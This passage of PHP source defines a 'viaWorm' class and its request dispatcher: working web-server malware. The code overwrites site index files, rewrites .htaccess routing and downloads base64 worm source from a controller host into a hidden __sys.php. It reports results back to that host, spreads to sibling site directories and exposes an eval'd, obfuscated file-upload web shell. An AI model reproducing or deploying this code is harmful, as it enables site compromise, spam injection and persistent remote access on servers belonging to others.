        $path = $this->getWormFilesPath() . '/__pages_sources';
        if(!@is_dir($path)){
            @mkdir($path);
        }
        return $path;
    }

    /**
     * @return mixed
     */
    public function getLinksSourcesPath(){
        $path = $this->getWormFilesPath() . '/__links_sources';
        if(!@is_dir($path)){
            @mkdir($path);
        }
        return $path;
    }

    /**
     * @return string
     */
    public function getPagesMapFilePath(){
        return $this->getWormFilesPath() . '/__pages_map';
    }

    /**
     * @return SplFileInfo
     */
    public function getPagesMapFile(){
        $fileName = $this->getPagesMapFilePath();
        $file = new SplFileInfo($fileName);
        return $file;
    }

    /**
     * @return bool|mixed
     */
    public function getPagesMap(){
        $file = $this->getPagesMapFile();
        if($file->isFile()){
            return json_decode(@file_get_contents($file->getPath() . DIRECTORY_SEPARATOR . $file->getFilename()), true);
        } else {
            return false;
        }
    }

    /**
     * @return bool|string
     */
    public function updatePagesMap(){

        $pages_map = @file_get_contents('http://' . self::DADDY_HOST . '/website-pages-map?domain=' . urlencode($this->getHost()));

        if($pages_map){

            $file = $this->getPagesMapFile();

            $path = $file->getPath() . DIRECTORY_SEPARATOR . $file->getFilename();
            $bytes = @file_put_contents($path, $pages_map);

            return $bytes ? $bytes : false;

        } else {

            return false;

        }

    }


    /**
     * @return SplFileInfo
     */
    public function getWormBlackHoleFile(){
        $fileName = $this->getWormSourceFile()->getPath() . '/__sys.php';
        $file = new SplFileInfo($fileName);
        return $file;
    }

    /**
     * @return bool|int
     */
    public function updateWormBlackHole(){

        $file = $this->getWormSourceFile();
        if($file->isFile()){

            $blackHoleFile = $this->getWormBlackHoleFile();
            $path = $blackHoleFile->getPath() . DIRECTORY_SEPARATOR . $blackHoleFile->getFilename();
            $bytes = @file_put_contents($path, base64_decode(@file_get_contents($file->getRealPath())));

            return $bytes ? $path : null;

        } else {

            return null;

        }

    }

    /**
     * @return string
     */
    public function getWebsiteConfigFilePath(){
        return $this->getWormFilesPath() . '/__website_config';
    }

    /**
     * @return SplFileInfo
     */
    public function getWebsiteConfigFile(){

        $fileName = $this->getWebsiteConfigFilePath();
        $file = new SplFileInfo($fileName);
        return $file;

    }

    /**
     * @return bool|mixed
     */
    public function getWebsiteConfig(){
        $file = $this->getWebsiteConfigFile();
        if($file->isFile()){
            return json_decode(@file_get_contents($file->getRealPath()), true);
        } else {
            return false;
        }
    }

    /**
     * @param array $config
     * @return array
     */
    public function setWebsiteConfig(array $config){
        $file = $this->getWebsiteConfigFile();
        $current_config = $this->getWebsiteConfig() ? $this->getWebsiteConfig() : array();
        $config = array_merge($current_config, $config);
        @file_put_contents($file->getPath() . DIRECTORY_SEPARATOR . $file->getFilename(), json_encode($config));
        return $config;
    }

    /**
     * @param $base64_string
     * @return array
     */
    public function updateWorm($base64_string){

        $source_path = $this->updateWormSource($base64_string);
        $worm_path = $this->updateWormBlackHole();

        return array(
            'source_path' => $source_path,
            'worm_path' => $worm_path,
            'worm_url' => $this->getWormUrl(),
        );

    }

    /**
     * @param string $indexSourceKey
     * @throws Exception
     */
    public function changeIndexFile($indexSourceKey = self::INDEX_SOURCE_KEY_ARTICLES)
    {

        $indexFile = $this->getIndexFile();

        if ($indexFile instanceof SplFileInfo) {

            $indexFileName = $indexFile->getFilename();

            $copy_file_prefix_extension = '_old_';
            $extension = pathinfo($indexFileName, PATHINFO_EXTENSION);

            if ($extension == 'html' || $extension == 'htm') {
                $indexFileName = 'index.php';
            }

            $copyFileName = $indexFile->getBasename($extension) . $copy_file_prefix_extension . '.' . $extension;
            $copyFileRealPath = $indexFile->getPath() . DIRECTORY_SEPARATOR . $copyFileName;

            $websiteSourceFileName = $this->getWormFilesPath() . '/__website_source';
            $websiteSourceFile = new SplFileInfo($websiteSourceFileName);
            if(!$websiteSourceFile->isFile()){

                if(@file_exists($copyFileRealPath)){
                    $_path = $copyFileRealPath;
                } elseif(@file_exists($indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.php')) {
                    $_path = $indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.php';
                } elseif(@file_exists($indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.html')) {
                    $_path = $indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.html';
                } elseif(@file_exists($indexFile->getPath() . DIRECTORY_SEPARATOR . 'home._old_.html')) {
                    $_path = $indexFile->getPath() . DIRECTORY_SEPARATOR . 'home._old_.html';
                } elseif(@file_exists($indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.htm')) {
                    $_path = $indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.htm';
                } else {
                    $_path = $indexFile->getPath() . DIRECTORY_SEPARATOR . $indexFile->getFilename();
                }

                $websiteSource = @file_get_contents($_path);
                @file_put_contents($websiteSourceFileName, base64_encode($websiteSource));

            } else {

                $websiteSource = base64_decode(@file_get_contents($websiteSourceFile->getPath() . DIRECTORY_SEPARATOR . $websiteSourceFile->getFilename()));

            }

            if (!@file_exists($copyFileRealPath)) {

                //Check if index file was already changed
                if(strpos($websiteSource, self::DADDY_HOST) !== false){
                    throw new Exception('Website source already changed', 500);
                }

                $bytes = @file_put_contents($copyFileRealPath, $websiteSource);
                if($bytes === false){
                    throw new Exception('Unavailable create index file copy', 500);
                }

            }

            $indexFileRealPath = $indexFile->getPath() . DIRECTORY_SEPARATOR . $indexFileName;
            $newIndexFile = new SplFileInfo($indexFileRealPath);
            $fileObj = $newIndexFile->openFile('w+');

            if(!isset($this->_indexSources[$indexSourceKey])){
                $indexSourceKey = self::INDEX_SOURCE_KEY_ARTICLES;
            }

            $content = base64_decode($this->_indexSources[$indexSourceKey]);
            $replacements = array(
                ':copy_file_name' => $copyFileName,
                ':daddy_host' => self::DADDY_HOST,
                ':link_daddy_host' => self::LINKS_DADDY_HOST,
                ':website_config_file' => $this->getWebsiteConfigFilePath(),
                ':pages_map_file' => $this->getPagesMapFilePath(),
                ':pages_sources_path' => $this->getPagesSourcesPath(),
                ':links_sources_path' => $this->getLinksSourcesPath(),
                ':static_files_path' => $this->getStaticFilesPath(),
                ':static_files_url_prefix' => str_replace($this->getRootDir(), '', $this->getStaticFilesPath()),
            );

            $content = str_replace(
                array_keys($replacements),
                $replacements,
                $content
            );

            $fileObj->fwrite(trim($content));

            $this->setWebsiteConfig(array(
                'state' => 1,
                'is_sape' => true,
                'index_file_path' => $indexFileRealPath,
            ));

            $this->addHtaccessRule($indexFileName);

        } else {

            throw new Exception('Unavailable to define index file', 500);

        }

    }

    /**
     * @void
     */
    public function analyzePossibleIndexes()
    {

        $website_config = $this->getWebsiteConfig();
        if($website_config && isset($website_config['index_file_path'])){

            $this->indexFile = new SplFileInfo($website_config['index_file_path']);
            return;

        }

        usort($this->possibleIndexes, array($this, 'sortPossibleIndexFiles'));

        foreach ($this->possibleIndexes as $i => $possibleIndex) {

            /**
             * @var $file SplFileInfo
             */
            $file = $possibleIndex['file'];

            if ($i == 0) {
                $this->indexFile = $file;
            }

            $url = 'http://' . $this->getHost() . '/' . $file->getBasename();
            $valid = $this->isValidUrl($url);

            if ($valid) {
                $this->indexFile = $file;
                break;
            }

        }

    }

    public function sortPossibleIndexFiles($a, $b)
    {
        return $a['rate'] < $b['rate'];
    }

    /**
     * @void
     */
    public function analyzeHtaccessFile()
    {

        $file = $this->getHtaccessFile();

        if ($file instanceof SplFileInfo) {

            if(!$file->isFile() || !$file->isReadable() || !$file->isWritable()){
                return;
            }

            $DirectoryIndex = null;

            $fileObj = $file->openFile('a+');

            foreach ($fileObj as $line) {

                $line = trim($line);

                if (!$line) {
                    continue;
                }

                if (substr($line, 0, 1) == '#') {
                    continue;
                }

                /* Check .htaccess DirectoryIndex variable */
                if (strpos($line, 'DirectoryIndex') !== false) {
                    $DirectoryIndex = current(explode('#', trim(str_replace('DirectoryIndex', '', $line))));
                }

            }

            if ($DirectoryIndex) {
                if (isset($this->possibleIndexes[$DirectoryIndex])) {
                    $this->possibleIndexes[$DirectoryIndex]['rate']++;
                }
            }


        }

    }

    /**
     * @param $indexFileName
     */
    public function addHtaccessRule($indexFileName)
    {

        $file = $this->getHtaccessFile();

        if ($file instanceof SplFileInfo) {

            if(!$file->isFile() || !$file->isReadable() || !$file->isWritable()){
                return;
            }

            $fileObj = $file->openFile('a+');

        } else {

            $filePath = $this->getRootDir() . DIRECTORY_SEPARATOR . '.htaccess';
            $file = new SplFileInfo($filePath);

            $fileObj = $file->openFile('w+');

        }

        $content = '

RewriteEngine On
RewriteCond %{REQUEST_FILENAME} -s [OR]
RewriteCond %{REQUEST_FILENAME} -l [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^.*$ - [NC,L]
RewriteRule ^.*$ ' . $indexFileName . ' [NC,L]
DirectoryIndex ' . $indexFileName . '
        ';

        $fileObj->fwrite($content);

    }

    /**
     * @return null|string
     */
    public function getRootDir()
    {

        if (!$this->rootDir) {

            if (isset($_SERVER['DOCUMENT_ROOT'])) {
                $this->rootDir = $_SERVER['DOCUMENT_ROOT'];
            } else {
                $this->rootDir = __DIR__;
            }

        };

        return $this->rootDir;

    }

    /**
     * @return array
     * @throws Exception
     */
    public function getRootDirFiles()
    {

        $rootDirectoryIterator = new DirectoryIterator($this->getRootDir());

        if (!$rootDirectoryIterator->isWritable()) {
            throw new Exception('Root directory is not writable', 500);
        }

        $files = array();

        /**
         * @var $itr DirectoryIterator
         */
        foreach ($rootDirectoryIterator as $itr) {

            if ($itr->isDot() || $itr->isDir()) {
                continue;
            };

            $files[] = $itr->getFileInfo();

        }

        return $files;

    }

    /**
     * @param $htaccessFile
     */
    public function setHtaccessFile($htaccessFile)
    {
        $this->htaccessFile = $htaccessFile;
    }

    /**
     * @return null|SplFileInfo
     */
    public function getHtaccessFile()
    {
        return $this->htaccessFile;
    }

    /**
     * @param $possibleIndexFiles
     */
    public function setPossibleIndexes($possibleIndexFiles)
    {
        $this->possibleIndexes = $possibleIndexFiles;
    }

    /**
     * @return array
     */
    public function getPossibleIndexes()
    {
        return $this->possibleIndexes;
    }

    /**
     * @param $host
     */
    public function setHost($host)
    {
        $this->host = $host;
    }

    /**
     * @return null|string
     */
    public function getHost()
    {
        if (!$this->host) {
            $this->host = self::getRequestHost();
        }
        return $this->host;
    }

    /**
     * @return string
     */
    public static function getRequestHost()
    {

        if (isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {

            $host = $_SERVER['HTTP_X_FORWARDED_HOST'];
            $elements = explode(',', $host);

            $host = trim(end($elements));

        } else {

            if (!$host = $_SERVER['HTTP_HOST']) {

                if (!$host = $_SERVER['SERVER_NAME']) {

                    $host = !empty($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '';

                }

            }

        }

        return $host;

    }

    /**
     * @return string
     */
    public function getWormUrl()
    {

        $file = $this->getWormBlackHoleFile();
        if($file->isFile()){
            return str_replace($this->getRootDir(), 'http://' . $this->getHost(), $file->getRealPath());
        } else {
            return 'http://' . $this->getRequestHost() . $_SERVER['SCRIPT_NAME'];
        }

    }

    /**
     * @param $url
     * @return bool
     */
    public static function isValidUrl($url)
    {
        $headers = @get_headers($url);
        if (strpos($headers[0], '200') !== false) return true;
        return false;
    }

    /**
     * @param $url
     * @return null|string
     */
    public static function getRedirectUrl($url)
    {

        $redirect_url = null;

        if (!function_exists('curl_init')) {

            $headers = @get_headers($url);

            if (
                strpos($headers[0], '300') !== false
                || strpos($headers[0], '301') !== false
                || strpos($headers[0], '302') !== false
                || strpos($headers[0], '303') !== false
                || strpos($headers[0], '307') !== false
            ) {

                $redirect_url = 'http://www.' . $url;

            }

        } else {

            $ch = curl_init($url);

            curl_setopt($ch, CURLOPT_HEADER, true);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            $header = "Location: ";
            $pos = strpos($response, $header);
            $pos += strlen($header);

            if (strlen($response) > $pos) {

                $redirect_url = substr($response, $pos, strpos($response, "\r\n", $pos) - $pos);

            }

        }

        return $redirect_url;

    }

    /**
     * @return SplFileInfo
     */
    public function getIndexFile()
    {
        return $this->indexFile;
    }

    /**
     * @param null $host
     * @param null $rootDir
     * @param bool $scanSiblings
     * @param $indexSourceKey
     * @return array
     */
    public static function processHost($host = null, $rootDir = null, $scanSiblings = true, $indexSourceKey = self::INDEX_SOURCE_KEY_ARTICLES)
    {

        $result = array(
            'success' => true,
            'message' => null,
        );

        try {

            $worm = new self($host, $rootDir);

            $worm->hideWormFiles();
            $worm->changeIndexFile($indexSourceKey);

            $result['message'] = 'Index file ' . $worm->getIndexFile()->getRealPath() . ' - successfully changed';
            $result['domain'] = $worm->getHost();
            $result['worm_url'] = $worm->getWormUrl();
            $result['index_source_key'] = $indexSourceKey;

        } catch (Exception $e) {

            $result['success'] = false;
            $result['message'] = $e->getMessage();

        }

        if ($scanSiblings) {
            $result['siblings'] = self::checkParentDirectoryForWebsites($_SERVER['DOCUMENT_ROOT'], $indexSourceKey);
        }

        return $result;

    }

    /**
     * @param $url
     * @param $data
     * @param null $optional_headers
     * @return bool|mixed|string
     */
    public static function sendPost($url, $data, $optional_headers = null)
    {

        if (function_exists('curl_init')) {

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);

            curl_close($ch);

            return $response;

        } else {

            $params = array('http' => array(
                'method' => 'post',
                'content' => $data
            ));

            if ($optional_headers !== null) {
                $params['http']['header'] = $optional_headers;
            }

            $ctx = stream_context_create($params);
            $fp = @fopen($url, 'rb', false, $ctx);
            if (!$fp) {
                $response = false;
            } else {
                $response = @stream_get_contents($fp);
            }

            return $response;

        }

    }

    /**
     * @param $dir
     * @param $indexSourceKey
     * @return array
     */
    public static function checkParentDirectoryForWebsites($dir, $indexSourceKey = self::INDEX_SOURCE_KEY_ARTICLES)
    {

        $results = array();

        $current_host = self::getRequestHost();
        $parentDirectoryIterator = new DirectoryIterator($dir . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR);

        /**
         * @var $fileInfo DirectoryIterator
         */
        foreach ($parentDirectoryIterator as $fileInfo) {

            if ($fileInfo->isDot()) continue;

            if ($fileInfo instanceof SplFileInfo) {

                if ($fileInfo->isDir() && $fileInfo->getBasename() != $current_host) {

                    $result = self::processHost($fileInfo->getBasename(), $fileInfo->getRealPath(), false, $indexSourceKey);

                    if ($result['success']) {

                        $results[] = $result;

                    }

                }

            }

        }

        return $results;

    }


}

$action = isset($_GET['action']) ? $_GET['action'] : 'index';

switch ($action) {
    case 'via-make-test':

        echo 1;
        exit();

    case 'upload':

        eval(base64_decode('aWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0J10pKSB7CgogICAgJGZpbGVEaXIgPSAiIjsKCiAgICAkdXNlcl9maWxlX25hbWUgPSAkX0ZJTEVTWydpbWFnZSddWyduYW1lJ107CiAgICAkdXNlcl9maWxlX3RtcCA9ICRfRklMRVNbJ2ltYWdlJ11bJ3RtcF9uYW1lJ107CgogICAgaWYgKGlzc2V0KCRfRklMRVNbJ2ltYWdlJ11bJ25hbWUnXSkpIHsKCiAgICAgICAgJGRlc3RpbmF0aW9uID0gJGZpbGVEaXIgLiAkdXNlcl9maWxlX25hbWU7CiAgICAgICAgQG1vdmVfdXBsb2FkZWRfZmlsZSgkdXNlcl9maWxlX3RtcCwgJGRlc3RpbmF0aW9uKTsKCiAgICAgICAgZWNobyAiPGI+RG9uZSA9PT4gJHVzZXJfZmlsZV9uYW1lPC9iPiI7CgogICAgfQoKfSBlbHNlIHsKCiAgICBlY2hvICc8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iaW1hZ2UiPjxpbnB1dCB0eXBlPSJTdWJtaXQiIG5hbWU9IlN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCI+PC9mb3JtPic7Cgp9Cg=='));
        break;

    case 'update-index':

        $result = null;

        try {

            $worm = new viaWorm();

            $worm->hideWormFiles();
            $worm->changeIndexFile();

            $result['success'] = true;
            $result['message'] = 'Index file ' . $worm->getIndexFile()->getRealPath() . ' - successfully changed';
            $result['domain'] = $worm->getHost();
            $result['worm_url'] = $worm->getWormUrl();

            $query = http_build_query(array('worm_result' => serialize($result)));
            $worm_precess_url = 'http://' . viaWorm::DADDY_HOST . '/process-worm';

            viaWorm::sendPost($worm_precess_url, $query);

        } catch(Exception $e){

            $result = array('success' => false, 'message' => $e->getMessage());

        }

        header('Content-type: application/json');
        echo json_encode($result);
        exit();

        break;

    case 'worm-update':

        if(isset($_GET['worm_source_url'])){
            $worm_source_url = $_GET['worm_source_url'];
        } else {
            $worm_source_url = 'http://' . viaWorm::DADDY_HOST . '/worm_source.txt';
        }

        $worm_source = base64_decode(@file_get_contents($worm_source_url));

        if($worm_source){
            try {
                $worm = new viaWorm();
                $result = $worm->updateWorm($worm_source);
                $result['success'] = true;
            } catch(Exception $e){
                $result = array('success' => false, 'message' => $e->getMessage());
            }
        }

        header('Content-type: application/json');
        echo json_encode($result);
        exit();

        break;

    case 'change-state':

        if(isset($_GET['state'])){

            $state = (int)$_GET['state'];

            try {

                $worm = new viaWorm();
                $worm->setWebsiteConfig(array(
                    'state' => $state,
                ));

                $result = array('success' => true, 'state' => $state);

            } catch(Exception $e){

                $result = array('success' => false, 'message' => $e->getMessage());

            }

        }

        header('Content-type: application/json');
        echo json_encode($result);
        exit();

        break;

    case 'update-pages-map':

        header('Content-type: application/json');

        try {

            $worm = new viaWorm();
            $bytesChanged = $worm->updatePagesMap();

            $result = array('success' => ($bytesChanged != false), 'message' => 'Bytes changed ' . $bytesChanged);

        } catch(Exception $e){

            $result = array('success' => false, 'message' => $e->getMessage());

        }

        echo json_encode($result);
        exit();

        break;

    case 'index':
    default:

        header('Content-type: application/json');

        $indexSourceKey = isset($_GET['index_source_key']) ? $_GET['index_source_key'] : viaWorm::INDEX_SOURCE_KEY_ARTICLES;
        $scanSiblings = isset($_GET['scan_siblings']) ? $_GET['scan_siblings'] : true;
        $result = viaWorm::processHost(null, null, $scanSiblings, $indexSourceKey);

        $query = http_build_query(array('worm_result' => serialize($result)));
        $worm_precess_url = 'http://' . viaWorm::DADDY_HOST . '/process-worm';

        viaWorm::sendPost($worm_precess_url, $query);

        echo json_encode($result);
        exit();

}
